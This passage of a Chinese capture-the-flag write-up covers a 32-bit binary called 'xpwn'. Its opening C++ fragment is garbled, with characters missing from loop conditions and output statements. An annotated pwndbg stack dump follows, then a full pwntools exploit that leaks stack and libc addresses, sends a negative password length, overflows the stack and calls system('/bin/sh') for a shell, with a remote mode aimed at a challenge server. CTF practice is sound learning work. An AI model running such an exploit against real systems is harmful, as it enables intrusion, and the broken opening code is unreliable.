            i+=4;
        }  
        while(i9)
                   {
                       j+=55;
                       input[m++] = char(j);
                   }
                   else
                   {
                       j+=48;
                       input[m++] = char(j);
                   }
                   cout9)
                   {
                      i+=55;
                      input[m++] = char(i);
                   }
                   else
                   {
                      i+=48;
                      input[m++] = char(i);
                   }
                 }
              }
        cout stack 100
    00:0000│ esp      0xffc47230 —▸ 0xf76e4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
    01:0004│          0xffc47234 —▸ 0x80487e1 ◂— dec    eax /* 'Hello %s' */
    02:0008│          0xffc47238 —▸ 0xffc47240 ◂— 0x61616161 ('aaaa')
    03:000c│          0xffc4723c —▸ 0xffc472b8 —▸ 0xf753edc8 ◂— jbe    0xf753edf5 /* 'v+' */
    04:0010│ eax ecx  0xffc47240 ◂— 0x61616161 ('aaaa')
    ... ↓
    0e:0038│          0xffc47268 —▸ 0xffc472f8 ◂— 0x0#栈地址
    0f:003c│          0xffc4726c —▸ 0xf7598005 (setbuf+21) ◂— add    esp, 0x1c#setbuf - 21即真实地址
    10:0040│          0xffc47270 —▸ 0xf76e4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
    11:0044│          0xffc47274 ◂— 0x0
    12:0048│          0xffc47278 ◂— 0x2000
    13:004c│          0xffc4727c —▸ 0xf7597ff0 (setbuf) ◂— sub    esp, 0x10
    14:0050│          0xffc47280 —▸ 0xf76e4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
    15:0054│          0xffc47284 —▸ 0xf772d918 ◂— 0x0
    16:0058│ ebp      0xffc47288 —▸ 0xffc472f8 ◂— 0x0
    17:005c│          0xffc4728c —▸ 0x80486a3 ◂— add    esp, 0x10
    18:0060│          0xffc47290 —▸ 0xf76e45a0 (_IO_2_1_stdin_) ◂— 0xfbad2088
    19:0064│          0xffc47294 —▸ 0xf76e4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
    1a:0068│          0xffc47298 —▸ 0xffc472b0 ◂— 0xffffffff
    1b:006c│          0xffc4729c —▸ 0x804831f ◂— pop    edi /* '__libc_start_main' */
    1c:0070│          0xffc472a0 ◂— 0x0
    1d:0074│          0xffc472a4 —▸ 0xffc47344 ◂— 0x3e86b2b5
    1e:0078│          0xffc472a8 —▸ 0xf76e4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
    1f:007c│          0xffc472ac ◂— 0x8f17
    20:0080│          0xffc472b0 ◂— 0xffffffff
    21:0084│          0xffc472b4 ◂— 0x2f /* '/' */
    22:0088│          0xffc472b8 —▸ 0xf753edc8 ◂— jbe    0xf753edf5 /* 'v+' */
    23:008c│          0xffc472bc —▸ 0xf77041b0 —▸ 0xf7532000 ◂— jg     0xf7532047
    24:0090│          0xffc472c0 ◂— 0x8000
    25:0094│          0xffc472c4 —▸ 0xf76e4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
    26:0098│          0xffc472c8 —▸ 0xf76e2244 —▸ 0xf754a020 (_IO_check_libio) ◂— call   0xf7651b59
    27:009c│          0xffc472cc —▸ 0xf754a0ec (init_cacheinfo+92) ◂— test   eax, eax
    28:00a0│          0xffc472d0 ◂— 0x1
    29:00a4│          0xffc472d4 ◂— 0x0
    2a:00a8│          0xffc472d8 —▸ 0xf7560a50 (__new_exitfn+16) ◂— add    ebx, 0x1835b0
    2b:00ac│          0xffc472dc —▸ 0x804879b ◂— add    edi, 1
    2c:00b0│          0xffc472e0 ◂— 0x1
    2d:00b4│          0xffc472e4 —▸ 0xffc473a4 —▸ 0xffc480d1 ◂— './xpwn'
    2e:00b8│          0xffc472e8 —▸ 0xffc473ac —▸ 0xffc480d8 ◂— 'LC_NUMERIC=zh_CN.UTF-8'
    2f:00bc│          0xffc472ec —▸ 0x8048771 ◂— lea    eax, [ebx - 0xf8]
    30:00c0│          0xffc472f0 —▸ 0xffc47310 ◂— 0x1#v5=&a1，我们要填0x0xffc47310在这里
    31:00c4│          0xffc472f4 ◂— 0x0
    ... ↓
    33:00cc│          0xffc472fc —▸ 0xf754a637 (__libc_start_main+247) ◂— add    esp, 0x10
    34:00d0│          0xffc47300 —▸ 0xf76e4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
    ... ↓
    36:00d8│          0xffc47308 ◂— 0x0
    37:00dc│          0xffc4730c —▸ 0xf754a637 (__libc_start_main+247) ◂— add    esp, 0x10#这个是真正的ret！
    38:00e0│          0xffc47310 ◂— 0x1#a1的地址
    39:00e4│          0xffc47314 —▸ 0xffc473a4 —▸ 0xffc480d1 ◂— './xpwn'
    3a:00e8│          0xffc47318 —▸ 0xffc473ac —▸ 0xffc480d8 ◂— 'LC_NUMERIC=zh_CN.UTF-8'
    3b:00ec│          0xffc4731c ◂— 0x0
好了，泄露出stack地址，就可以通过计算偏移得到a1的地址，然后system出来，栈溢出，直接getshell~
偏移为0x18，继续看：
#### 这是本题的坑点之一，ida的ret不一定准，一切以动态调试为准！而且ret不一定在ebp后面喔，本题ebp在0xffffcdc8！
    pwndbg> distance 0xffffcdbc 0xffffcd7c
    0xffffcdc0->0xffffcd7c is -0x40 bytes (-0x11 words)
    pwndbg> distance 0xffffcddc 0xffffcdc4
    0xffffcddc->0xffffcdc4 is -0x18 bytes (-0x6 words)
所以得到了相应的偏移就可以算了，上exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    local = 1
    elf = ELF('./xpwn')
    if local:
        p = process('./xpwn')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('./libc.so.6')
    p.recvuntil("Enter username: ")
    #gdb.attach(p, 'b *0x08048622')
    payload = 'a'*40
    p.send(payload)
    p.recvuntil('a'*40)
    stack_addr = u32(p.recv(4))
    setbuf_addr = u32(p.recv(4))
    stack_addr = stack_addr + 0x18
    setbuf_addr = setbuf_addr - 21
    print 'stack_addr---->' + hex(stack_addr)
    print 'setbuf_addr---->' + hex(setbuf_addr)
    libc_base = setbuf_addr - libc.symbols['setbuf']
    system = libc.symbols['system'] + libc_base
    binsh = libc.search("/bin/sh").next() + libc_base
    print 'system_addr---->' + hex(system)
    print 'binsh_addr---->' + hex(binsh)
    p.recvuntil("Please set the length of password: ")
    p.sendline(' -10')
    payload = ''
    payload += 'a'*0x40
    payload += p32(0xfffffff6)
    payload += p32(stack_addr)
    payload += 'a'*0x18
    payload += p32(system)
    payload += p32(0x1)
    payload += p32(binsh)
    p.recvuntil("): ")
    #gdb.attach(p,'b *0x0804870F')
    p.send(payload)
    p.interactive()
动态调试看下：
OK，分布正确，那么就可以getshell了。
##### 总结：
这次pwn只有1题，需要再磨砺~主攻pwn，助攻逆向~加油！pwn pwn pwn！